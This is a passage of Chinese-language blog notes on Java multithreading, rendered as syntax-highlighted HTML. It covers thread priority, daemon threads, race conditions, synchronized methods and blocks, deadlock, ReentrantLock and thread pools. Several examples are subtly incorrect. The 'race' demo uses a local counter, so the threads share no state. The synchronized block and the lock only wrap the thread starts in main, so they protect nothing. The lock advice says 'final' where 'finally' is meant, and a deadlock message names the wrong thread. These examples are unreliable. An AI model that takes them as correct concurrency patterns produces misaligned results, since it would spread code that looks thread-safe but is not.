punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--->"</span> <span class="token operator">+</span> thread2<span class="token punctuation">.</span><span class="token function">getPriority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//默认优先级</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>thread3<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--->"</span> <span class="token operator">+</span> thread3<span class="token punctuation">.</span><span class="token function">getPriority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//最低优先级</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>thread4<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--->"</span> <span class="token operator">+</span> thread4<span class="token punctuation">.</span><span class="token function">getPriority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//最高优先级</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210730125400420.png" alt="image-20210730125400420"></p><h2 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h2><p><img src="image-20210730164204886.png" alt="image-20210730164204886"></p><p><code>**Thread.setDaemon()</code>方法用于设置守护线程**</p><p><strong>用户线程默认为<code>Thread.setDaemon(flase)</code>不需要我们特意定义</strong></p><p><strong>守护线程需要我们定义为<code>Thread.setDaemon(true)</code></strong></p><p>守护线程经常被用来执行一些后台任务</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 守护线程 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是用户线程"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Thread thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//设置死循环</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是守护线程"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        thread<span class="token punctuation">.</span><span class="token function">setDaemon</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置守护线程</span>        thread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"用户线程结束"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210730170312877.png" alt="image-20210730170312877"></p><p>用户线程结束，守护线程随之结束</p><h1 id="并发问题"><a href="#并发问题" class="headerlink" title="并发问题"></a>并发问题</h1><p>当多个线程操控同一个对象时，会出现并发问题</p><p>例如：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 并发问题 <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        并发问题 bf <span class="token operator">=</span> <span class="token keyword">new</span> 并发问题<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>bf<span class="token punctuation">,</span> <span class="token string">"小明"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>bf<span class="token punctuation">,</span> <span class="token string">"小华"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>bf<span class="token punctuation">,</span> <span class="token string">"小红"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"抢到了第"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">"张票"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            num<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就是一个多个线程调用同一个对象时遇到的最典型的并发问题</p><p><img src="image-20210725102022650.png" alt="image-20210725102022650"></p><p>可以直观的看到第10张票被三个人抢到了，在安全领域中，这就是一种条件竞争</p><h2 id="线程同步和锁"><a href="#线程同步和锁" class="headerlink" title="线程同步和锁"></a>线程同步和锁</h2><p>线程同步和锁是对并发问题发处理</p><h3 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h3><p>线程同步即在多个线程调用一个对象时，每个线程对对象的影响都会同步到对象上</p><p>为了实现这个目的，引入了队列的概念</p><ul><li><p><strong>队列</strong></p><blockquote><p><strong>队列即将要使用相同对象的线程进行“排队”，使之依次完成对此对象的调用</strong></p><p><strong>要“排队”的线程会进入对象的等待池</strong></p></blockquote></li></ul><h3 id="锁"><a href="#锁" class="headerlink" title="锁"></a><strong>锁</strong></h3><p><strong>锁确保了一个对象在同一时间只能被一个线程调用</strong></p><p>每个对象都有 “一把锁”</p><blockquote><p>队列中的线程会依次拿到 “锁” 对对象进行调用，确保同步的安全性</p></blockquote><p><img src="image-20210730172018425.png" alt="image-20210730172018425"></p><h2 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h2><p><img src="image-20210730173232587.png" alt="image-20210730173232587"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 同步方法 <span class="token punctuation">{</span>    <span class="token keyword">public</span>  <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Piao piao <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Piao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>piao<span class="token punctuation">,</span><span class="token string">"小明"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>piao<span class="token punctuation">,</span><span class="token string">"小华"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>piao<span class="token punctuation">,</span><span class="token string">"小红"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Piao</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//同步方法</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> top <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>top<span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s抢到了第%d张票%n"</span><span class="token punctuation">,</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>            num<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> top <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="同步块"><a href="#同步块" class="headerlink" title="同步块"></a>同步块</h2><p><img src="image-20210730173514163.png" alt="image-20210730173514163"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 同步方法 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Runnable runnable <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> top <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>top<span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s抢到了第%d张票%n"</span><span class="token punctuation">,</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>                num<span class="token operator">--</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> top <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>runnable<span class="token comment" spellcheck="true">/*线程共享资源*/</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//定义同步块</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span> <span class="token string">"小明"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span> <span class="token string">"小华"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span> <span class="token string">"小红"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><p><img src="image-20210731171336711.png" alt="image-20210731171336711"></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 死锁 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object t1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object t2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>t1<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Thread1 get t1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>t2<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Thread2 get t2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>t2<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Thread2 get t2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>t1<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Thread2 get t1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210731175052873.png" alt="image-20210731175052873"></p><h2 id="Lock锁"><a href="#Lock锁" class="headerlink" title="Lock锁"></a>Lock锁</h2><p><strong><code>lock</code>是基于<code>synchronized</code>的进一步优化，即将不可见的隐性锁变为了显性锁</strong></p><blockquote><p>使用<code>lock</code>锁需要<code>new ReentrantLock()</code>(译为可重入锁)</p><p>以<code>lock.lock()</code>定义锁的开启（加锁）</p><p>以<code>lock.unlock()</code>定义锁的结束（解锁）</p><p>建议使用<code>Lock</code>时用<code>try</code>包裹<code>lock.lock()</code>以及加锁的语句</p><p>用<code>final</code>包裹<code>lock.unlock()</code></p></blockquote><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span>ReentrantLock<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Lock</span>锁 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Runnable runnable <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>            <span class="token keyword">boolean</span> top <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>top<span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s抢到了第%d张票%n"</span><span class="token punctuation">,</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>                num<span class="token operator">--</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> top <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ReentrantLock lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span> <span class="token string">"小明"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span> <span class="token string">"小华"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span> <span class="token string">"小红"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="线程协作（生产者消费者问题）"><a href="#线程协作（生产者消费者问题）" class="headerlink" title="线程协作（生产者消费者问题）"></a>线程协作（生产者消费者问题）</h1><h2 id="线程通信"><a href="#线程通信" class="headerlink" title="线程通信"></a>线程通信</h2><p><img src="image-20210731192038481.png" alt="image-20210731192038481"></p><h3 id="管程法"><a href="#管程法" class="headerlink" title="管程法"></a>管程法</h3><p><img src="image-20210731192512834.png" alt="image-20210731192512834"></p><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><p><img src="image-20210731194554509.png" alt="image-20210731194554509"></p><p><code>ExecutorService</code>类是真正的线程池类</p><p><code>Executors</code>是线程池工具类</p><p><code>ExecutorService service = Executors.newFixedThreadPool(1);</code> 创建线程池</p><p><code>service.shutdown()</code>关闭线程池</p><ul><li><p>使用<code>ExecutorService</code>类遵循三个步骤</p><blockquote><p>创建：<code>ExecutorService service</code></p><p>执行：<code>ervice.execute()</code></p><p>获取（可选），详请见重写<code>Callable</code>类创建线程</p><p>关闭：<code>service.shutdown()</code></p></blockquote></li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>ExecutorService<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>Executors<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 线程池 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//创建</span>        ExecutorService service <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//执行</span>        service<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">new</span> 线程<span class="token function">123</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        service<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">new</span> 线程<span class="token function">123</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        service<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">new</span> 线程<span class="token function">123</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//关闭</span>        service<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> 线程<span class="token number">123</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"线程"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java日记</title>
      <link href="/2021/07/02/java%E6%97%A5%E8%AE%B0/"/>
      <url>/2021/07/02/java%E6%97%A5%E8%AE%B0/</url>
      
